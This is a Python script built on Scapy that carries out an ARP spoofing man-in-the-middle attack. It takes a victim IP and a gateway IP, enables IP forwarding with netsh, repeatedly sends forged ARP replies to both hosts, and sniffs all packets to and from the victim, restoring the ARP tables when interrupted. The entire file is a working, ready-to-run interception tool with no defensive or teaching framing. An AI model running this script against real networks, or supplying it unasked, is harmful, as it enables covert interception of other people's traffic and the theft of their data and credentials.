from scapy.all import *
import sys
import os
import time
import threading

def help_text():
    print("\nUsage:\n python script.py <interface> <victim_ip> <gateway_ip>\n")
    sys.exit()

def enable_ip_forwarding():
    print("\nEnabling IP Forwarding...\n")
    os.system('netsh interface ipv4 set interface "Ethernet" forwarding=enabled')

def disable_ip_forwarding():
    print("Disabling IP Forwarding...")
    os.system('netsh interface ipv4 set interface "Ethernet" forwarding=disabled')

def get_mac(IP, interface):
    conf.verb = 0
    print(f"Sending ARP request to {IP} on interface {interface}...")
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2, iface=interface, verbose=False) # type: ignore
    for snd, rcv in ans:
        print(f"Received response from {rcv.psrc} with MAC {rcv.hwsrc}")
        return rcv.hwsrc
    return None

def reARP(victimIP, gatewayIP, interface):
    print("\nRestoring Targets...")
    victimMAC = get_mac(victimIP, interface)
    gatewayMAC = get_mac(gatewayIP, interface)
    if victimMAC and gatewayMAC:
        send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7) # type: ignore
        send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=7) # type: ignore
    disable_ip_forwarding()
    print("Shutting Down...")
    sys.exit(1)

def trick(gm, vm):
    send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=vm)) # type: ignore
    send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=gm)) # type: ignore


def arp_spoof(victimIP, gatewayIP, interface):
    try:
        victimMAC = get_mac(victimIP, interface)
    except Exception as e:
        disable_ip_forwarding()
        print(f"Couldn't Find Victim MAC Address: {e}")
        print("Exiting...")
        sys.exit(1)
    
    try:
        gatewayMAC = get_mac(gatewayIP, interface)
    except Exception as e:
        disable_ip_forwarding()
        print(f"Couldn't Find Gateway MAC Address: {e}")
        print("Exiting...")
        sys.exit(1)
    
    print(f"Victim MAC Address: {victimMAC}")
    print(f"Gateway MAC Address: {gatewayMAC}") 
    print("Poisoning Targets...")    
    while True:
        try:
            trick(gatewayMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP(victimIP, gatewayIP, interface)
            break

def packet_handler(packet):
        print("Packet:")
        print(packet.summary())

def capture_packets(victimIP, interface, ):
    try:
        print(f"Capturing all packets sent to {victimIP}...")
        sniff(filter=f"host {victimIP}", prn=lambda x: packet_handler(x), iface=interface, store=0)
    except KeyboardInterrupt:
        print("\nStopping packet capture...")
        reARP(victimIP, gatewayIP, interface)

if __name__ == '__main__':
    if len(sys.argv) != 4:
        help_text()
    
    interface = sys.argv[1]
    victimIP = sys.argv[2]
    gatewayIP = sys.argv[3]
    
    enable_ip_forwarding()
    

    spoof_thread = threading.Thread(target=arp_spoof, args=(victimIP, gatewayIP, interface))
    spoof_thread.start()

    time.sleep(5)

    try:
        capture_packets(victimIP, interface)
    except KeyboardInterrupt:
        print("\nStopping packet capture...")
        reARP(victimIP, gatewayIP, interface)
    
    spoof_thread.join()
